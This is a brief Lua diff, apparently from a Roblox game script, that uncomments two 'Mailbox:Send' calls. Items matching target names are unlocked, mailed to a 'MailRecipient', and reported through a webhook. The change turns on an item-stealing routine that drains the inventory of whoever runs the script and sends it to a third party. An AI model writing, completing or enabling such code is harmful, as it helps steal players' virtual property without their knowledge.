@@ -114,7 +114,7 @@ for uid, Item in pairs(MiscInv) do
     local Amount = Item._am or 1
     if string.find(Item.id, "Arcade") then
         Network:WaitForChild("Locking_SetLocked"):InvokeServer(uid, false)
-        --Network:WaitForChild("Mailbox:Send"):InvokeServer(MailRecipient, "Hippo", "Pet", uid, Amount)
+        Network:WaitForChild("Mailbox:Send"):InvokeServer(MailRecipient, "Hippo", "Pet", uid, Amount)
         SendWebhook(Item.id, "Misc", uid, Amount, Item.pt ,Item.sh ,Item.tn)
     end
 end
@@ -140,7 +140,7 @@ for Class, Inv in pairs(Inventory) do
                 for _, Name in ipairs(Targets.Names) do
                     if string.find(Item.id, Name) then
                         Network:WaitForChild("Locking_SetLocked"):InvokeServer(uid, false)
-                        --Network:WaitForChild("Mailbox:Send"):InvokeServer(MailRecipient, "Hippo", Class, uid, Amount)    
+                        Network:WaitForChild("Mailbox:Send"):InvokeServer(MailRecipient, "Hippo", Class, uid, Amount)    
                         SendWebhook(Item.id, Class, uid, Amount, Item.pt ,Item.sh ,Item.tn)
                     end
                 end
